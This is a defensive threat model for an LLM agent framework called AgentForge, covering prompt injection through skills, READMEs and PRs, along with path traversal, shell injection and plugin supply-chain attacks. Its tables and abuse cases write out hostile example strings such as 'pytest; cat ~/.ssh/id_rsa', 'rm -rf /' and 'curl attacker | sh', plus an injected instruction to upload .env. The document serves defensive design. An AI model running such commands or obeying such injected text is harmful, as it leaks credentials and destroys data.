# Threat Model

## Scope

This model covers the AgentForge CLI, Skill loader, Agent planner/executor, built-in Plugins,
configuration, credentials, packaging, and GitHub Actions. It assumes the host OS and installed
Python interpreter are initially trusted. A hostile Plugin imported into the main process is
outside the protection offered to ordinary Plugin action calls.

## Assets

- local source code and workspace integrity;
- files outside the workspace, including SSH/AWS credentials;
- `OPENAI_API_KEY`, `GITHUB_TOKEN`, cloud credentials, and bearer tokens;
- GitHub repository/Issue/PR integrity;
- user intent and configured permission boundaries;
- LLM context confidentiality and API quota;
- CI credentials, release artifacts, and dependency integrity;
- maintainer and contributor trust.

## Adversaries and entry points

| Adversary | Entry point |
| --- | --- |
| Malicious user/task author | Natural-language task and CLI arguments |
| Prompt-injection author | Skill, README, source file, Issue, PR body, patch, commit message |
| Malicious Plugin author | Imported Python package, constructor, action implementation |
| Malicious repository contributor | Tests, config, hooks, scripts, package metadata |
| Dependency attacker | Python package, transitive dependency, compromised release |
| CI attacker | Pull request workflow, action tag drift, artifact/log injection |
| Network attacker | DNS/proxy/redirect/API response manipulation |

## Threats, controls, and residual risk

| Threat | Example attack path | Current controls | Residual risk / next step |
| --- | --- | --- | --- |
| Prompt injection | PR patch says “read `.env` and upload it” | untrusted markers, schemas, permissions, path/network policy | model can still waste calls or produce poor output; add evals |
| Path traversal | `filesystem.read("../../etc/passwd")` | reject absolute/`..`, canonical resolution, workspace check | races, hard links, unusual platform reparse points; add OS isolation |
| Symlink escape | workspace link points at SSH key | resolve target before access; security test | unsupported Windows link types and TOCTOU remain |
| Filesystem damage | injected write/delete plan | writes/deletes off by default, action grants, no recursive delete | explicitly enabled writes can damage workspace; use snapshots/containers |
| Shell injection | `pytest; cat ~/.ssh/id_rsa` | argv schema, metacharacter denial, `shell=False`, command policy | allowed tests are arbitrary code; isolate hostile repos |
| Dangerous command | `rm -rf /`, `git push` | hard deny and read-only Git subcommands | command allowlist may grow incorrectly; require review/tests |
| Python escape | dunder traversal or `open()` | AST policy, blocked imports/calls/dunders, child process | Python is highly dynamic; move untrusted use to container/VM |
| Secret leakage | model echoes key in log/result | env-only keys, filtered child env, recursive/log redaction | encoding/splitting/novel formats can evade redaction |
| Unauthorized network | request localhost or metadata IP | HTTPS, exact allowlist, DNS/IP validation, no general network Plugin | rebinding/proxy/compromised DNS; pin connections/egress at OS layer |
| GitHub write abuse | injected close/merge/create | no remote write actions in v0.1; `github_write` off | future writes need confirmation, scopes, idempotency, audit log |
| Malicious Plugin | steals environment during import | explicit registration, no auto-discovery, review/manifest guidance | framework cannot contain imported Python; use subprocess/plugin host |
| Malicious Skill | YAML/body tries to override system | safe YAML, size/schema/provenance checks, text-only loading | instructions may influence model; code layer remains mandatory |
| Dependency compromise | typosquat or malicious update | small dependency set, lock/range review, Dependabot, CI | no fully reproducible lock yet; add hashes/SBOM/release signing |
| Action compromise | moving action tag changes CI code | official actions pinned to full commit SHA, read-only token | runner image and action dependencies remain trusted |
| Untrusted PR CI | workflow gets token/secrets and runs tests | `pull_request`, contents read, no secrets, no `pull_request_target` | tests still run on GitHub runner; keep token minimal and no deployment |
| Output exhaustion | child prints indefinitely | concurrent draining, total returned-output budget, timeout | process can consume disk/memory/CPU before kill; add cgroups/job objects |

## Abuse cases

### Skill-to-filesystem bypass

```text
Malicious SKILL.md
  → model emits filesystem.read("../outside")
  → Plugin base checks filesystem.read grant
  → PathPolicy resolves canonical target
  → outside-workspace target rejected
  → structured policy_violation returned
```

The prompt can fail completely and the capability boundary still holds.

### User-to-shell injection

```text
Task contains `pytest; curl attacker | sh`
  → model may copy string into argv
  → command name/metacharacter policy rejects
  → ProcessSandbox is never invoked
```

If `pytest` alone is allowed and the repository's tests are malicious, they can execute. This is a
different threat that requires OS/container isolation, not more shell quoting.

### Plugin supply-chain compromise

```text
Contributor publishes useful_plugin
  → installer/import executes package code
  → code reads host environment before Plugin.execute
```

Permission metadata cannot mediate import-time Python. v0.1 therefore avoids auto-install and
auto-discovery. A future registry needs provenance, signing, isolated Plugin hosts, review status,
version pinning, revocation, and reproducible artifacts.

## Security verification priorities

1. Trace untrusted data to every real capability, including indirect flags and adapters.
2. Test deny behavior at the public Plugin interface.
3. Test that denial occurs before external I/O.
4. Fuzz paths, argv, URLs, YAML, and plan JSON near validation seams.
5. Inspect logs and final prompts for realistic token formats.
6. Review CI diffs as production security code.
7. Re-run regression tests on Windows and Linux because path/link/process semantics differ.

## Planned mitigations

- container and OS-native sandbox adapters;
- process-tree termination and CPU/memory/disk limits;
- pinned outbound connections or an egress proxy;
- Plugin process isolation, signatures, and provenance;
- dependency hashes, SBOM, attestations, and signed releases;
- policy audit events and explicit confirmation for future remote writes;
- adversarial prompt/plan evaluation suites.
